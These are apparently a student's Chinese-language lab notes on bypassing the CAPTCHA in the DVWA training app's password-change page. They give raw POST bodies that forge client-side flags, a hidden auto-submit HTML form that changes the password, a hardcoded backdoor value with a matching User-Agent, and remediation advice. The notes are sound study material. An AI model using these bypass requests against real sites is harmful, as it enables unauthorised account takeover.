# CAPTCHA

改密页面加了验证码，验证码本身没被破解，被绕过的是"验证过没过"这件事怎么记录。三档的错误一个比一个离谱：先靠客户端传流程参数，再靠客户端传标记，最后是源码里留了后门。

## 漏洞在哪

不在验证码算法，在"验证过没过"这件事由谁说了算：

```php
// Low
if ($_POST['step'] == 2) { /* 直接改密，不再确认验证码 */ }

// Medium
if ($_POST['passed_captcha'] == 'true') { /* 认为已通过 */ }
```

两处都在听客户端自述。客户端能说的话，攻击者也能说。

## 前置：先配 key

DVWA 用 Google reCAPTCHA，没配 key 页面只显示 `reCAPTCHA API key missing`，表单不出现。

```php
// DVWA/config/config.inc.php
$_DVWA['recaptcha_public_key']  = '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI';
$_DVWA['recaptcha_private_key'] = '6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe';
```

这两串是 Google 公开的测试 key，任何域名可用，专供调试。配不上也不影响学绕过逻辑，后三级都不碰验证码本身。

![配上 key 的页面](fix.png)

## 等级对照

| 等级 | 判断依据 | 绕过 | 状态 |
|---|---|---|---|
| Low | 客户端传的 `step` | 直接提交 `step=2` | 实测成功 |
| Medium | 客户端传的 `passed_captcha` | 加 `passed_captcha=true` | 实测成功 |
| High | 真验证 + 源码后门 | `hidd3n_valu3` + 特定 UA | 未在本机跑通，见参考 |
| Impossible | 服务端向 Google 验证 | 无 | 打不进去 |

## Low

| 项 | 内容 |
|---|---|
| 流程 | `step=1` 填密码过验证码，`step=2` 真正改密 |
| 缺口 | 第二步不再确认验证码是否通过 |
| 绕过 | 请求体里把 `step` 改成 2，删掉 `g-recaptcha-response` |

```
POST /dvwa/vulnerabilities/captcha/ HTTP/1.1
Cookie: security=low; PHPSESSID=xxxx

password_new=123456&password_conf=123456&Change=Change&step=2
```

本地写个表单同样能过：

```html
<form action="http://127.0.0.1/dvwa/vulnerabilities/captcha/" method="POST">
  <input type="hidden" name="password_new" value="123456">
  <input type="hidden" name="password_conf" value="123456">
  <input type="hidden" name="Change" value="Change">
  <input type="hidden" name="step" value="2">
  <input type="submit" value="Submit">
</form>
```

要害是**业务流程状态存在客户端**。隐藏字段只是嘴上不说，用户照样能改。

## Medium

| 项 | 内容 |
|---|---|
| 变化 | 用 `passed_captcha` 标记代替 `step` |
| 缺口 | 这个标记由客户端提交 |
| 绕过 | 请求体末尾加 `passed_captcha=true`，Repeater 发一次即可 |

```
password_new=123456&password_conf=123456&Change=Change&passed_captcha=true
```

本质是"让客户端告诉服务端我验过了"。任何"我通过了"的自述都不能当凭证，凭证必须由服务端判定并存在服务端。

## High

| 项 | 内容 |
|---|---|
| 防护 | 真验证 + token 校验 |
| 缺口 | 源码留了一段调试判断 |
| 条件 | `g-recaptcha-response=hidd3n_valu3` 且 `User-Agent: reCAPTCHA` |

```php
if ($resp || ($_POST['g-recaptcha-response'] == 'hidd3n_valu3'
              && $_SERVER['HTTP_USER_AGENT'] == 'reCAPTCHA')) {
    // 验证通过
}
```

Burp Repeater 改两处：请求头 `User-Agent: reCAPTCHA`，请求体 `g-recaptcha-response=hidd3n_valu3`。`user_token` 仍要正确，token 错了就刷新页面重抓，只改这两项。

**这一级我没在本机跑通**，因为没有真实可用的 reCAPTCHA 站点，前端提交流程不完整。上面的判断条件和值来自源码说明与 DeepWiki 的项目文档，属于读代码发现的，不是打出来的。

价值不在绕过本身，在于它演示了一类真实问题：开发期的调试后门被带到了生产环境。

## Impossible

- 服务端拿 private key 自己向 Google 校验 `g-recaptcha-response`
- 没有 `step` 之类的客户端流程参数
- 没有 `passed_captcha` 标记
- 没有硬编码后门
- 改密还要求当前密码

第一条是根本。客户端能提供的只有一个 Google 签发的 token，伪造不了。

## 容易记错的地方

- 页面显示 key missing 不是靶场坏了，要自己填 config。
- Low 只删 `g-recaptcha-response` 不改 `step` 会失败，两件事要一起做。
- High 不要硬凑成功截图，没跑通就写没跑通，面试被追问细节时才对得上。
- 验证码和 CSRF token 是两件事，token 不能替代验证码。

## 怎么修

| 措施 | 作用 |
|---|---|
| 服务端校验验证码 | private key 只在服务端 |
| 验证状态存 Session | 不放隐藏字段、不放请求参数 |
| 关键操作二次确认 | 当前密码、短信码 |
| 上线前清调试代码 | 硬编码值、测试分支一律删 |
| 失败提示统一 | 不区分验证码错与密码错 |

## 参考

- High 等级的后门条件（`hidd3n_valu3` + `User-Agent: reCAPTCHA`）出自 DeepWiki 对 digininja/DVWA 的源码说明，本机未完成验证。
- Low、Medium 两级为本机实测。
